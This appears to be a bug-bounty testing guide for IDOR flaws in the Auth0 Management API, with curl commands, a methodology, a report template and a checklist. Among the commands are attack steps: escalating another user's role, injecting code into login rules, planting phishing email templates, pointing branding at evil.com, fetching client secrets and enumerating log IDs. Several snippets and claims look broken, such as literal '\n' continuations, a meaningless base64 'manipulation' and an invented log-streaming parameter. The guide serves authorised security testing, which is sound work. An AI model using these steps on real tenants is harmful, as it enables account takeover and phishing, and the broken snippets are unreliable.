# Auth0 IDOR Testing Guide

## Program Overview

| Attribute | Details |
|-----------|---------|
| **Platform** | Bugcrowd (private program) |
| **Program Type** | Bug Bounty + Responsible Disclosure |
| **Scope** | Auth0 tenants (*.auth0.com), Management API, integrations |
| **Bounty Range** | $100 - $10,000+ (based on severity) |
| **Key Targets** | Users, Clients, Connections, Rules, Logs, Actions |

---

## 🚨 Important Notes

1. **Auth0 Bug Bounty is Private** - Must be invited via Bugcrowd to participate
2. **Responsible Disclosure** - If not in bug bounty program, use https://auth0.com/docs/troubleshoot/customer-support/responsible-disclosure-program-security-support-tickets
3. **Test on your own tenant** - Never test on production tenants you don't own
4. **Focus on implementations** - Most Auth0 IDORs are in how developers implement Auth0, not in Auth0 itself

---

## IDOR Patterns & Attack Vectors

### 1. User ID Enumeration

**Pattern:** `GET /api/v2/users/{user_id}`

Auth0 user IDs are formatted as `provider|unique_identifier` (e.g., `auth0|123456789abcdef`). While not purely numeric, they can be enumerable if:
- IDs are exposed in logs, responses, or other endpoints
- Token scope allows broad user access
- Sequential or predictable identifiers are used

**Test Cases:**

```bash
# Test 1: Get user by ID
curl -s "https://{your-tenant}.auth0.com/api/v2/users/auth0|123456789" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 2: List users (with read:users scope)
curl -s "https://{your-tenant}.auth0.com/api/v2/users" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 3: Search users by email
curl -s "https://{your-tenant}.auth0.com/api/v2/users?q=email:test@example.com&search_engine=v3" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 4: Get user by email
curl -s "https://{your-tenant}.auth0.com/api/v2/users-by-email?email=test@example.com" \n  -H "Authorization: Bearer ${TOKEN}"
```

### 2. User profile/Metadata IDOR

**Pattern:** `PATCH /api/v2/users/{user_id}`

**Test Cases:**

```bash
# Test 1: Read another user's profile
curl -s "https://{your-tenant}.auth0.com/api/v2/users/auth0|123456789" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 2: Update another user's profile
curl -s -X PATCH "https://{your-tenant}.auth0.com/api/v2/users/auth0|123456789" \n  -H "Authorization: Bearer ${TOKEN}" \n  -H "Content-Type: application/json" \n  -d '{"user_metadata": {"role": "admin"}}'

# Test 3: Get user's roles
curl -s "https://{your-tenant}.auth0.com/api/v2/users/auth0|123456789/roles" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 4: Get user's permissions
curl -s "https://{your-tenant}.auth0.com/api/v2/users/auth0|123456789/permissions" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 5: Get user's multifactor assets
curl -s "https://{your-tenant}.auth0.com/api/v2/users/auth0|123456789/multifactor" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 6: Get user's Guardian factors
curl -s "https://{your-tenant}.auth0.com/api/v2/users/auth0|123456789/guardian" \n  -H "Authorization: Bearer ${TOKEN}"
```

### 3. Client ID Enumeration

**Pattern:** `GET /api/v2/clients/{client_id}`

Auth0 client IDs are 24-character alphanumeric strings.

**Test Cases:**

```bash
# Test 1: List all clients
curl -s "https://{your-tenant}.auth0.com/api/v2/clients" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 2: Get client by ID
curl -s "https://{your-tenant}.auth0.com/api/v2/clients/CLIENT_ID_24_CHARS" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 3: Update client configuration
curl -s -X PATCH "https://{your-tenant}.auth0.com/api/v2/clients/CLIENT_ID_24_CHARS" \n  -H "Authorization: Bearer ${TOKEN}" \n  -H "Content-Type: application/json" \n  -d '{"app_metadata": {"sensitive": "data"}}'

# Test 4: Get client secrets (if scope allows)
curl -s "https://{your-tenant}.auth0.com/api/v2/clients/CLIENT_ID_24_CHARS/secrets" \n  -H "Authorization: Bearer ${TOKEN}"
```

### 4. Connection ID Enumeration

**Pattern:** `GET /api/v2/connections/{connection_id}`

Connection IDs are formatted as `con_...`.

**Test Cases:**

```bash
# Test 1: List all connections
curl -s "https://{your-tenant}.auth0.com/api/v2/connections" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 2: Get connection by ID
curl -s "https://{your-tenant}.auth0.com/api/v2/connections/con_123456789abcdef" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 3: Get connection's users
curl -s "https://{your-tenant}.auth0.com/api/v2/connections/con_123456789abcdef/users" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 4: Update connection settings
curl -s -X PATCH "https://{your-tenant}.auth0.com/api/v2/connections/con_123456789abcdef" \n  -H "Authorization: Bearer ${TOKEN}" \n  -H "Content-Type: application/json" \n  -d '{"options": {"passwordPolicy": "low"}}'
```

### 5. Rules/Actions IDOR

**Pattern:** `GET /api/v2/rules/{rule_id}` and `POST /api/v2/rules`

Auth0 Rules and Actions execute code during login flow. IDOR here could lead to privilege escalation.

**Test Cases:**

```bash
# Test 1: List all rules
curl -s "https://{your-tenant}.auth0.com/api/v2/rules" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 2: Get rule by ID
curl -s "https://{your-tenant}.auth0.com/api/v2/rules/rul_123456789abcdef" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 3: Update rule code (inject malicious code)
curl -s -X PATCH "https://{your-tenant}.auth0.com/api/v2/rules/rul_123456789abcdef" \n  -H "Authorization: Bearer ${TOKEN}" \n  -H "Content-Type: application/json" \n  -d '{"script": "function(user, context, callback) { // malicious code }"}'

# Test 4: List all actions
curl -s "https://{your-tenant}.auth0.com/api/v2/actions/actions" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 5: Get action details
curl -s "https://{your-tenant}.auth0.com/api/v2/actions/act_123456789abcdef" \n  -H "Authorization: Bearer ${TOKEN}"
```

### 6. Log ID Enumeration

**Pattern:** `GET /api/v2/logs/{log_id}`

Log IDs are sequential and enumerable.

**Test Cases:**

```bash
# Test 1: Access another user's audit logs
curl -s "https://{your-tenant}.auth0.com/api/v2/logs?page=0&per_page=100" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 2: Access specific log entry by ID
curl -s "https://{your-tenant}.auth0.com/api/v2/logs/9000000000000000001" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 3: Search logs by user
curl -s "https://{your-tenant}.auth0.com/api/v2/logs?user_id=auth0|123456789" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 4: Filter logs by type
curl -s "https://{your-tenant}.auth0.com/api/v2/logs?type=slo" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 5: Stream logs in real-time (Pusher integration)
curl -s "https://{your-tenant}.auth0.com/api/v2/logs?enrolment=true" \n  -H "Authorization: Bearer ${TOKEN}"
```

### 7. Tenant Settings IDOR

**Pattern:** `GET /api/v2/tenants/settings`

**Test Cases:**

```bash
# Test 1: Access full tenant settings
curl -s "https://{your-tenant}.auth0.com/api/v2/tenants/settings" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 2: Update tenant branding (phishing potential)
curl -s -X PATCH "https://{your-tenant}.auth0.com/api/v2/tenants/settings" \n  -H "Authorization: Bearer ${TOKEN}" \n  -H "Content-Type: application/json" \n  -d '{"branding": {"logo_url": "https://evil.com/fake-logo.png"}}'

# Test 3: Update default tenant language
curl -s -X PATCH "https://{your-tenant}.auth0.com/api/v2/tenants/settings" \n  -H "Authorization: Bearer ${TOKEN}" \n  -H "Content-Type: application/json" \n  -d '{"default_directory": "Username-Password-Authentication"}'
```

### 8. Email Template IDOR

**Pattern:** `GET /api/v2/email-templates/{template_name}`

**Test Cases:**

```bash
# Test 1: List email templates
curl -s "https://{your-tenant}.auth0.com/api/v2/email-templates" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 2: Get verification email template
curl -s "https://{your-tenant}.auth0.com/api/v2/email-templates/verify_email" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 3: Update email template (phishing)
curl -s -X PATCH "https://{your-tenant}.auth0.com/api/v2/email-templates/verify_email" \n  -H "Authorization: Bearer ${TOKEN}" \n  -H "Content-Type: application/json" \n  -d '{"body": "<html><body>Phishing content...</body></html>"}'

# Test 4: Get reset email template
curl -s "https://{your-tenant}.auth0.com/api/v2/email-templates/reset_email" \n  -H "Authorization: Bearer ${TOKEN}"
```

### 9. Resource Server/API IDOR

**Pattern:** `GET /api/v2/resource-servers/{api_id}`

**Test Cases:**

```bash
# Test 1: List all resource servers (APIs)
curl -s "https://{your-tenant}.auth0.com/api/v2/resource-servers" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 2: Get resource server by ID
curl -s "https://{your-tenant}.auth0.com/api/v2/resource-servers/https://api.example.com" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 3: Get API signing keys
curl -s "https://{your-tenant}.auth0.com/api/v2/resource-servers/https://api.example.com/signing-keys" \n  -H "Authorization: Bearer ${TOKEN}"
```

### 10. Role/ Permission IDOR

**Pattern:** `GET /api/v2/roles/{role_id}/permissions`

**Test Cases:**

```bash
# Test 1: List all roles
curl -s "https://{your-tenant}.auth0.com/api/v2/roles" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 2: Get role permissions
curl -s "https://{your-tenant}.auth0.com/api/v2/roles/rol_123456789abcdef/permissions" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 3: Get role users
curl -s "https://{your-tenant}.auth0.com/api/v2/roles/rol_123456789abcdef/users" \n  -H "Authorization: Bearer ${TOKEN}"

# Test 4: Add permission to role (privilege escalation)
curl -s -X POST "https://{your-tenant}.auth0.com/api/v2/roles/rol_123456789abcdef/permissions" \n  -H "Authorization: Bearer ${TOKEN}" \n  -H "Content-Type: application/json" \n  -d '{"permissions": [{"resource_server_identifier": "https://api.example.com", "scope": "admin:all"}]}'
```

---

## Testing Methodology

### Phase 1: Setup and Reconnaissance

```bash
# 1. Create your own Auth0 tenant (free tier available)
# https://auth0.com/signup

# 2. Create test users and applications
# Register at least two users with different permission levels

# 3. Get Management API token
# Go to Applications > APIs > Auth0 Management API > Test
# Or create a Machine-to-Machine app with appropriate scopes

# 4. Identify your test user IDs
curl -s "https://{your-tenant}.auth0.com/api/v2/users" \n  -H "Authorization: Bearer ${TOKEN}"
```

### Phase 2: Baseline Testing

```bash
# 1. Create two test users (User A and User B)
# Get their IDs

# 2. Verify User A can access their own profile
curl -s "https://{your-tenant}.auth0.com/api/v2/users/${USER_A_ID}" \n  -H "Authorization: Bearer ${USER_A_TOKEN}"

# 3. Verify User A cannot access User B's profile (control test)
curl -s "https://{your-tenant}.auth0.com/api/v2/users/${USER_B_ID}" \n  -H "Authorization: Bearer ${USER_A_TOKEN}"
# Should return 403 Forbidden or 404 Not Found
```

### Phase 3: IDOR Exploitation

```bash
# 1. Try to access User B's resources with User A's token

# 2. Horizontal escalation (same privilege level)
curl -s "https://{your-tenant}.auth0.com/api/v2/users/${USER_B_ID}" \n  -H "Authorization: Bearer ${USER_A_TOKEN}"

# 3. Vertical escalation (if you have low-privilege token)
# Attempt to access admin resources with regular user token
```

### Phase 4: Impact Demonstration

```bash
# Demonstrate real impact by accessing or modifying sensitive data

# 1. Access user's roles and permissions
curl -s "https://{your-tenant}.auth0.com/api/v2/users/${USER_B_ID}/roles" \n  -H "Authorization: Bearer ${USER_A_TOKEN}"

# 2. Access audit logs
curl -s "https://{your-tenant}.auth0.com/api/v2/logs" \n  -H "Authorization: Bearer ${USER_A_TOKEN}"

# 3. Modify email templates (phishing)
curl -s -X PATCH "https://{your-tenant}.auth0.com/api/v2/email-templates/verify_email" \n  -H "Authorization: Bearer ${TOKEN}" \n  -H "Content-Type: application/json" \n  -d '{"body": "Phishing template"}'
```

---

## Common IDOR Indicators

| Indicator | HTTP Code | Meaning |
|-----------|-----------|---------|
| **Success** | `200 OK` | ✅ Potential IDOR - returned data for unauthorized resource |
| **Forbidden** | `403 Forbidden` | ✅ Secure - proper authorization |
| **Not Found** | `404 Not Found` | ⚠️ Resource doesn't exist OR hidden |
| **Unauthorized** | `401 Unauthorized` | Token invalid or missing |
| **Gone** | `410 Gone` | Resource deleted but ID was valid |

---

## IDOR Bypass Techniques

### 1. ID Enumeration
```bash
# Sequential log ID enumeration
for id in $(seq 9000000000000000000 9000000000000000100); do
  curl -s "https://{tenant}.auth0.com/api/v2/logs/$id" \n    -H "Authorization: Bearer ${TOKEN}" | grep -o '"user_id":"[^"]*"'
done
```

### 2. Parameter Pollution
```bash
# Add multiple ID parameters
curl -s "https://{tenant}.auth0.com/api/v2/users?search_engine=v3&q=email:user@example.com" \n  -H "Authorization: Bearer ${TOKEN}"
```

### 3. HTTP Method Switching
```bash
# Try different methods on the same endpoint
curl -s -X PUT "https://{tenant}.auth0.com/api/v2/users/${USER_ID}" 
curl -s -X PATCH "https://{tenant}.auth0.com/api/v2/users/${USER_ID}"
curl -s -X DELETE "https://{tenant}.auth0.com/api/v2/users/${USER_ID}"
```

### 4. Base64URL ID Manipulation
```bash
# User IDs are often base64url encoded
# Try decoding and manipulating
echo "auth0|123456789" | base64 -d
# Then modify and re-encode
```

### 5. Search Engine Bypass
```bash
# Use v3 search engine which has different behavior
curl -s "https://{tenant}.auth0.com/api/v2/users?q=*&search_engine=v3" \n  -H "Authorization: Bearer ${TOKEN}"

# Use query string variations
curl -s "https://{tenant}.auth0.com/api/v2/users-by-email?email=test@example.com" \n  -H "Authorization: Bearer ${TOKEN}"
```

---

## Impact Assessment

| Access Type | Impact | Example |
|-------------|--------|---------|
| **Read User Profile** | Medium | Access other users' PII, emails, metadata |
| **Update User Profile** | High | Modify user metadata, escalate privileges |
| **Access Audit Logs** | **Critical** | View all user activity, security events |
| **Modify Email Templates** | **Critical** | Phishing attacks, credential theft |
| **Modify Rules/Actions** | **Critical** | Inject malicious code during login flow |
| **Access Client Secrets** | **Critical** | OAuth client secret exposure |
| **Modify Connections** | High | Change SSO configurations |
| **Role/Permission Escalation** | **Critical** | Grant yourself admin privileges |

---

## Report Template

```markdown
## Title
IDOR Allowing [Impact] via [Endpoint/Parameter]

## Summary
[One paragraph describing the vulnerability]

## Steps to Reproduce
1. Login to Auth0 tenant with User A account
2. Navigate to [location] or obtain API token with scope [scope]
3. Send the following request:
```bash
curl -s "https://{tenant}.auth0.com/api/v2/[endpoint]/${VICTIM_ID}" \n  -H "Authorization: Bearer ${TOKEN}"
```
4. Observe that [sensitive data] is returned in the response

## Expected vs Actual
- **Expected:** 403 Forbidden or 404 Not Found
- **Actual:** 200 OK with [sensitive data]

## Impact
[Explain the security impact - what can an attacker do?]

## Remediation
[Suggest how to fix the IDOR]
```

---

## Testing Checklist

- [ ] Create test Auth0 tenant
- [ ] Obtain Management API tokens with different scopes
- [ ] Test `/api/v2/users/{user_id}` for user enumeration
- [ ] Test `/api/v2/users/{user_id}/roles` for role escalation
- [ ] Test `/api/v2/users/{user_id}/permissions` for permission escalation
- [ ] Test `/api/v2/users/{user_id}/guardian` for MFA access
- [ ] Test `/api/v2/clients/{client_id}` for client enumeration
- [ ] Test `/api/v2/connections/{connection_id}` for connection access
- [ ] Test `/api/v2/rules/{rule_id}` for rules injection
- [ ] Test `/api/v2/logs/{log_id}` for log enumeration
- [ ] Test `/api/v2/tenants/settings` for tenant configuration
- [ ] Test `/api/v2/email-templates/{template}` for phishing
- [ ] Test `/api/v2/roles/{role_id}/permissions` for privilege escalation
- [ ] Test `/api/v2/resource-servers/{api_id}` for API access
- [ ] Document all successful IDOR findings with PoC
- [ ] Test `/api/v2/tickets/{ticket_id}` for password reset IDOR
- [ ] Test `/api/v2/email-verification-tickets/{ticket_id}` for verification ticket IDOR
- [ ] Test `/api/v2/guardian/enrollments/{id}` for MFA enrollment IDOR
- [ ] Test `/api/v2/device-credentials` for device credential access
- [ ] Test `/api/v2/client-grants` for OAuth grant manipulation
- [ ] Test `/api/v2/jobs/{job_id}` for job enumeration
- [ ] Test `/api/v2/stats/active-users` for tenant activity leakage
- [ ] Test `/api/v2/user-blocks` for brute force protection bypass

---

## References

- [Auth0 Management API Documentation](https://auth0.com/docs/api/management/v2)
- [Auth0 Bug Bounty Program](https://bugcrowd.com/auth0) (invitation only)
- [Auth0 Responsible Disclosure](https://auth0.com/docs/troubleshoot/customer-support/responsible-disclosure-program-security-support-tickets)
- [OWASP IDOR Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [Auth0 Security Best Practices](https://auth0.com/docs/security)